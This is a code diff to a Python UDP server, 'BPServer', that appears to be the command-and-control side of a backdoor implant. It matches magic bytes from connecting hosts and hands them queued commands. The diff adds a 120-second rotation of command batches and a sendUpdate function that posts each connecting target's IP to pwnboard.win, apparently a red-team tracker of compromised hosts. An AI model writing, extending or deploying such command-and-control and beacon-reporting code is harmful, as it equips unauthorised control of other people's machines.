@@ -1,6 +1,8 @@
+import datetime
 import queue
 import socket
 from threading import Thread
+import requests
 
 MAGIC_BYTES = b'\x42\x50\x3c\x33'
 REQUEST_BYTE = b'\x01'
@@ -23,12 +25,23 @@ class BPServer(Thread):
         self.remote_port = remote_udp_port
         self.execution_queue = execution_queue
         self.push_queue = push_queue
+        self.time_to_wait = 120
+        self.time_waiting = datetime.datetime.now()
 
     def add_to_execution(self, task):
         self.execution_queue.put(task)
 
     def add_to_push(self, task):
         self.push_queue.put(task)
+
+    def sendUpdate(self, ip, name="BP"):
+        host = "http://pwnboard.win/generic"
+        d = {'ip': ip, 'type': name}
+        try:
+            requests.post(host, json=d, timeout=3)
+            return True
+        except Exception as E:
+            return False
 
     def run(self):
         """
@@ -58,15 +71,18 @@ class BPServer(Thread):
                 continue
             except:
                 continue
-            if len(target_cmds) == 0:
+            elapsed = (datetime.datetime.now() - self.time_waiting).total_seconds()
+            if len(target_cmds) == 0 or elapsed > self.time_to_wait:
                 try:
                     target_cmds = self.execution_queue.get_nowait()
                     self.lock.acquire()
                     self.rooms.send(f'QUEUE {self.execution_queue.qsize()}')
                     self.lock.release()
+                    self.time_waiting = datetime.datetime.now()
                 except queue.Empty:
                     pass
             cur_target = address[0]
+            self.sendUpdate(cur_target)
             target_address = bytes(map(int, cur_target.split('.')))
             cmd_num = data[6:10]
             if MAGIC_BYTES in data[0:4] and REQUEST_BYTE == data[4:5]:
